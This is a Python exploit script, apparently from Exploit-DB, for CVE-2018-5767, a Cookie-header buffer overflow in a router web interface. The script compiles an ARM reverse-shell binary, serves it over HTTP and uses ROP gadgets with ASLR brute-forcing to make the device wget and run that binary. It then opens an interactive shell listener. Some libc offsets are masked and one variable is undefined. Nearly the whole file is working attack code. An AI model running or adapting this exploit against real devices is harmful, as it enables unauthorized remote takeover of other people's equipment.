@@ -1,0 +1,243 @@
+#!/usr/bin/env python
+# EDB Note ~ Source: https://www.fidusinfosec.com/remote-code-execution-cve-2018-5767/
+import urllib2
+import struct
+import time
+import socket
+from optparse import *
+import SimpleHTTPServer
+import SocketServer
+import threading
+import sys
+import os
+import subprocess
+ 
+ARM_REV_SHELL = (
+"#include <sys/socket.h>\n"
+"#include <sys/types.h>\n"
+"#include <string.h>\n"
+"#include <stdio.h>\n"
+"#include <netinet/in.h>\n"
+"int main(int argc, char **argv)\n"
+"{\n"
+"           struct sockaddr_in addr;\n"
+"           socklen_t addrlen;\n"
+"           int sock = socket(AF_INET, SOCK_STREAM, 0);\n"
+ 
+"           memset(&addr, 0x00, sizeof(addr));\n"
+ 
+"           addr.sin_family = AF_INET;\n"
+"           addr.sin_port = htons(%d);\n"
+"           addr.sin_addr.s_addr = inet_addr(\"%s\");\n"
+ 
+"           int conn = connect(sock, (struct sockaddr *)&addr,sizeof(addr));\n"
+ 
+"           dup2(sock, 0);\n"
+"           dup2(sock, 1);\n"
+"           dup2(sock, 2);\n"
+ 
+"           system(\"/bin/sh\");\n"
+"}\n"
+)
+ 
+REV_PORT = 31337
+HTTPD_PORT = 8888
+DONE = False
+ 
+"""
+* This function creates a listening socket on port
+* REV_PORT. When a connection is accepted it updates
+* the global DONE flag to indicate successful exploitation.
+* It then jumps into a loop whereby the user can send remote
+* commands to the device, interacting with a spawned /bin/sh
+* process.
+"""
+def threaded_listener():
+            global DONE
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+           
+            host = ("0.0.0.0", REV_PORT)
+           
+            try:
+                        s.bind(host)
+            except:
+                        print "[+] Error binding to %d" %REV_PORT
+                        return -1
+ 
+ 
+            print "[+] Connect back listener running on port %d" %REV_PORT
+           
+            s.listen(1)
+            conn, host = s.accept()
+ 
+            #We got a connection, lets make the exploit thread aware
+            DONE = True
+ 
+            print "[+] Got connect back from %s" %host[0]
+            print "[+] Entering command loop, enter exit to quit"
+ 
+            #Loop continuosly, simple reverse shell interface.
+            while True:
+                        print "#",
+                        cmd = raw_input()
+                        if cmd == "exit":
+                                    break
+                        if cmd == '':
+                                    continue
+ 
+                        conn.send(cmd + "\n")
+ 
+                        print conn.recv(4096)
+ 
+"""
+* Take the ARM_REV_SHELL code and modify it with
+* the given ip and port to connect back to.
+* This function then compiles the code into an
+* ARM binary.
+@Param comp_path – This should be the path of the cross-compiler.
+@Param my_ip – The IP address of the system running this code.
+"""
+def compile_shell(comp_path, my_ip):
+            global ARM_REV_SHELL
+            outfile = open("a.c", "w")
+ 
+            ARM_REV_SHELL = ARM_REV_SHELL%(REV_PORT, my_ip)
+           
+            outfile.write(ARM_REV_SHELL)
+            outfile.close()
+ 
+            compile_cmd = [comp_path, "a.c","-o", "a"]
+ 
+            s = subprocess.Popen(compile_cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+           
+            while s.poll() == None:
+                        continue
+ 
+            if s.returncode == 0:
+                        return True
+            else:
+                        print "[x] Error compiling code, check compiler? Read the README?"
+                        return False
+ 
+"""
+* This function uses the SimpleHTTPServer module to create
+* a http server that will serve our malicious binary.
+* This function is called as a thread, as a daemon process.
+"""
+def start_http_server():
+            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+            httpd = SocketServer.TCPServer(("", HTTPD_PORT), Handler)
+ 
+            print "[+] Http server started on port %d" %HTTPD_PORT
+            httpd.serve_forever()
+           
+ 
+"""
+* This function presents the actual vulnerability exploited.
+* The Cookie header has a password field that is vulnerable to
+* a sscanf buffer overflow, we make use of 2 ROP gadgets to
+* bypass DEP/NX, and can brute force ASLR due to a watchdog
+* process restarting any processes that crash.
+* This function will continually make malicious requests to the
+* devices web interface until the DONE flag is set to True.
+@Param host – the ip address of the target.
+@Param port – the port the webserver is running on.
+@Param my_ip – The ip address of the attacking system.
+"""
+def exploit(host, port, my_ip):
+            global DONE
+            url = "http://%s:%s/goform/exeCommand"%(host, port)
+            i = 0
+ 
+            command = "wget http://%s:%s/a -O /tmp/a && chmod 777 /tmp/a && /tmp/./a &;" %(my_ip, HTTPD_PORT)
+ 
+            #Guess the same libc base continuosly
+            libc_base = ****
+            curr_libc = libc_base + (0x7c << 12)
+ 
+            system = struct.pack("<I", curr_libc + ****)
+ 
+            #: pop {r3, r4, r7, pc}
+            pop = struct.pack("<I", curr_libc + ****)
+            #: mov r0, sp ; blx r3
+            mv_r0_sp = struct.pack("<I", curr_libc + ****)
+ 
+            password = "A"*offset
+            password += pop + system + "B"*8 + mv_r0_sp + command + ".gif"
+ 
+            print "[+] Beginning brute force."
+            while not DONE:
+                        i += 1                 
+                        print "[+] Attempt %d" %i
+ 
+                        #build the request, with the malicious password field
+                        req = urllib2.Request(url)                     
+                        req.add_header("Cookie", "password=%s"%password)
+ 
+                        #The request will throw an exception when we crash the server,
+                        #we don't care about this, so don't handle it.
+                        try:
+                                    resp = urllib2.urlopen(req)
+                        except:
+                                    pass
+ 
+                        #Give the device some time to restart the
+                        time.sleep(1)
+ 
+            print "[+] Exploit done"
+ 
+ 
+def main():
+            parser = OptionParser()
+            parser.add_option("-t", "–target", dest="host_ip", help="IP address of the target")
+            parser.add_option("-p", "–port", dest="host_port", help="Port of the targets webserver")
+            parser.add_option("-c", "–comp-path", dest="compiler_path", help="path to arm cross compiler")
+            parser.add_option("-m", "–my-ip", dest="my_ip", help="your ip address")
+ 
+            options, args = parser.parse_args()
+ 
+            host_ip = options.host_ip
+            host_port = options.host_port
+            comp_path = options.compiler_path
+            my_ip = options.my_ip
+ 
+            if host_ip == None or host_port == None:
+                        parser.error("[x] A target ip address (-t) and port (-p) are required")
+ 
+            if comp_path == None:
+                        parser.error("[x] No compiler path specified, you need a uclibc arm cross compiler, such as https://www.uclibc.org/downloads/binaries/0.9.30/cross-compiler-arm4l.tar.bz2")
+ 
+            if my_ip == None:
+                        parser.error("[x] Please pass your ip address (-m)")
+ 
+ 
+            if not compile_shell(comp_path, my_ip):
+                        print "[x] Exiting due to error in compiling shell"
+                        return -1
+ 
+            httpd_thread = threading.Thread(target=start_http_server)
+            httpd_thread.daemon = True
+            httpd_thread.start()
+           
+            conn_listener = threading.Thread(target=threaded_listener)
+            conn_listener.start()
+ 
+            #Give the thread a little time to start up, and fail if that happens
+            time.sleep(3)
+ 
+            if not conn_listener.is_alive():
+                        print "[x] Exiting due to conn_listener error"
+                        return -1
+           
+ 
+            exploit(host_ip, host_port, my_ip)
+           
+           
+            conn_listener.join()
+           
+            return 0
+ 
+           
+ 
+if __name__ == '__main__':
+            main()
